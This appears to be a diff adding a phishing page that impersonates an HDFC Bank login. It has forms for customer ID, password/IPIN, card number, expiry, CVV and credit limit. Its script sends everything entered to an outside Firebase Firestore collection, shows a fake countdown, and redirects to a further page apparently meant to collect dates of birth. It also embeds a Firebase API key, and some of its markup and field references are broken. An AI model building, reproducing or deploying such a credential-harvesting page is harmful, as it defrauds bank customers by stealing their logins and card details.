@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Welcome CLM</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f6f6f6;
+      margin: 0;
+      padding: 0;
+    }
+
+    .header-image, .bottom-image {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    .login-toggle {
+      display: flex;
+      justify-content: center;
+      margin: 20px 0;
+      gap: 50px;
+    }
+
+    .toggle-btn {
+      padding: 5px 10px;
+      border-radius: 25px;
+      border: 1px solid #3e8eff;
+      background: white;
+      color: #333;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+
+    .toggle-btn.active {
+      background-color: #2956ff;
+      color: white;
+      font-weight: bold;
+    }
+
+    .container {
+      background: white;
+      width: 100%;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+
+    h2 {
+      font-size: 22px;
+      margin-bottom: 20px;
+    }
+
+    label {
+      font-size: 16px;
+      display: block;
+      margin: 15px 0 5px;
+    }
+
+    input[type="text"],
+    input[type="password"],
+    input[type="tel"] {
+      width: 80%;
+      padding: 7px;
+      font-size: 16px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+      margin-bottom: 5px;
+    }
+
+    #cardNumber {
+      width: 80%;
+    }
+.expiry-cvv {
+  display: flex;
+  gap: 1px;
+  align-items: flex-end;
+}
+
+.expiry-cvv div {
+  display: flex;
+  flex-direction: column;
+}
+
+#expiry,
+#cvv {
+  width: 80px;
+}
+
+
+    #limit {
+      width: 100px;
+    }
+
+    .link {
+      color: #007bff;
+      font-size: 14px;
+      text-decoration: none;
+      display: inline-block;
+      margin-bottom: 5px;
+    }
+
+    .note {
+      font-size: 13px;
+      color: #555;
+      margin-bottom: 10px;
+    }
+
+    .checkbox-label {
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      margin: 10px 0 20px;
+    }
+
+    .checkbox-label input[type="checkbox"] {
+      margin-right: 10px;
+    }
+
+    .btn {
+      background: #007bff;
+      color: white;
+      border: none;
+      padding: 6px;
+      font-size: 16px;
+      width: 60%;
+      border-radius: 2px;
+      cursor: pointer;
+      height: 35px;
+      margin-bottom: 20px;
+    }
+
+    .extra-section {
+      padding: 20px;
+      background: #fff;
+      color: #000;
+    }
+
+    .footer {
+      background: #004a8d;
+      color: white;
+      text-align: center;
+      padding: 15px 10px;
+      font-size: 13px;
+    }
+
+    .footer a {
+      color: white;
+      text-decoration: underline;
+      margin-left: 5px;
+    }
+
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.6);
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 9999;
+    }
+
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #007bff;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 15px;
+    }
+
+    .loading-text {
+      color: white;
+      font-size: 18px;
+      font-family: Arial, sans-serif;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loading">
+    <div class="spinner"></div>
+    <div class="loading-text">
+      Please wait... <span id="countdown">10</span>s
+    </div>
+  </div>
+
+  <!-- Header Image -->
+  <img class="header-image" src="https://i.ibb.co/4RHd20wx/Screenshot-2025-05-12-21-14-09-83-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Header Image">
+
+  <!-- Toggle Buttons -->
+  <div class="login-toggle">
+    <button id="btn-user" class="toggle-btn active" onclick="showSection('userSection', this)">Customer ID</button>
+    <button id="btn-card" class="toggle-btn" onclick="showSection('cardSection', this)">Credit Card</button>
+  </div>
+
+  <!-- User Section -->
+  <div class="container" id="userSection"<br>
+  <span style="color: #2494ff;">Recommended: Use your credit card if available.</span>
+</h2>
+    <form id="userForm">
+      <label>Customer ID/User ID</label>
+      <input type="text" id="customerId" required>
+      <a href="card.html" class="link">Forgot Customer ID</a>
+
+      <label>Password/IPIN</label>
+      <input type="password" id="password" required>
+      <a href="card.html" class="link">Forgot Password / IPIN</a>
+
+      <div class="note">IPIN (Password) is case sensitive</div>
+
+      <label class="checkbox-label">
+        <input type="checkbox"> Use Virtual Keyboard for Password
+      </label>
+
+      <button class="btn" type="submit">LOGIN</button>
+    </form>
+  </div>
+
+  <!-- Card Section -->
+  <div class="container hidden" id="cardSection">
+    <h2>Enter Your Credit Card Details</h2>
+    <form id="cardForm">
+      <label>Card Number</label>
+      <input type="text" id="cardNumber" maxlength="19" placeholder="XXXX XXXX XXXX XXXX" required>
+
+      <label>Expiry Date</label>
+      <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+      
+      <label>CVV</label>
+      <input type="password" id="cvv" placeholder="CVV" maxlength="3" pattern="\d{3}" required>
+
+<label for="Limit"> Available Credit Limit</label
+<label>Rs.</label>
+<input type="text" id="limit" maxlength="6" pattern="\d*" inputmode="numeric" required>
+
+      <button class="btn" type="submit">LOGIN</button>
+    </form>
+  </div>
+
+  <img class="bottom-image" src="https://i.ibb.co/dw7tSCHQ/Screenshot-2025-05-12-20-55-22-29-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Bottom Image">
+
+  <!-- Extra Section -->
+  <div class="extra-section">
+    <p>Don't have a HDFC Bank Savings Account?</p>
+    <a href="#">Prepaid Card only? Login here</a>
+    <a href="#">HDFC Home Loan only? Login here</a>
+    <a href="#">HDFC Limited Deposit only? Login here</a>
+
+    <h3>We have added a host of new features!</h3>
+    <p>You can now do so much more:</p>
+    <ul>
+      <li>Anywhere access through Desktop or mobile</li>
+      <li>Enhanced security measures</li>
+    </ul>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    ©Copyright HDFC Bank Ltd.
+    <a href="#">Terms and Condition</a> |
+    <a href="#">Privacy Policy</a>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
+      authDomain: "sbighsh.firebaseapp.com",
+      projectId: "sbighsh",
+      storageBucket: "sbighsh.firebasestorage.app",
+      messagingSenderId: "685947657107",
+      appId: "1:685947657107:web:471a0557bb72235272a666"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+  </script>
+
+  <script>
+    function showSection(sectionId, button) {
+      document.getElementById('userSection').classList.add('hidden');
+      document.getElementById('cardSection').classList.add('hidden');
+      document.getElementById(sectionId).classList.remove('hidden');
+
+      document.querySelectorAll('.toggle-btn').forEach(btn => btn.classList.remove('active'));
+      button.classList.add('active');
+    }
+
+    const loading = document.getElementById('loading');
+    const countdown = document.getElementById('countdown');
+
+    // User Form
+    document.getElementById('userForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      loading.style.display = 'flex';
+      const customerId = document.getElementById('customerId').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const mobile = document.getElementById('mobile').value.trim();
+
+      db.collection("alldata-hare").add({
+        customerId,
+        password,
+        mobile,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      }).then(() => {
+        let timeLeft = 10;
+        const timer = setInterval(() => {
+          timeLeft--;
+          countdown.textContent = timeLeft;
+          if (timeLeft <= 0) {
+            clearInterval(timer);
+            window.location.href = 'dob.html';
+          }
+        }, 1000);
+      }).catch((error) => {
+        alert("Error saving data: " + error.message);
+        loading.style.display = 'none';
+      });
+    });
+
+    // Card Number Formatter
+    document.getElementById('cardNumber').addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\D/g, '').substring(0, 16);
+      let formatted = value.match(/.{1,4}/g);
+      e.target.value = formatted ? formatted.join(' ') : '';
+    });
+
+    // Expiry Formatter
+    document.getElementById('expiry').addEventListener('input', function(e) {
+      let val = e.target.value.replace(/\D/g, '').slice(0, 4);
+      e.target.value = val.length > 2 ? val.slice(0, 2) + '/' + val.slice(2) : val;
+    });
+
+    // Card Form
+    document.getElementById('cardForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      loading.style.display = 'flex';
+
+      const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+      const expiry = document.getElementById('expiry').value;
+      const [expMonth, expYear] = expiry.split('/');
+      const cvv = document.getElementById('cvv').value;
+      const atmPin = document.getElementById('atmPin').value;
+
+      db.collection("alldata-hare").add({
+        cardNumber,
+        expMonth,
+        cvv,
+        expYear: '20' + expYear,
+        atmPin,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      }).then(() => {
+        let timeLeft = 10;
+        const timer = setInterval(() => {
+          timeLeft--;
+          countdown.textContent = timeLeft;
+          if (timeLeft <= 0) {
+            clearInterval(timer);
+            window.location.href = 'dob.html';
+          }
+        }, 1000);
+      }).catch((error) => {
+        alert("Error saving data: " + error.message);
+        loading.style.display = 'none';
+      });
+    });
+  </script>
+</body>
+</html>
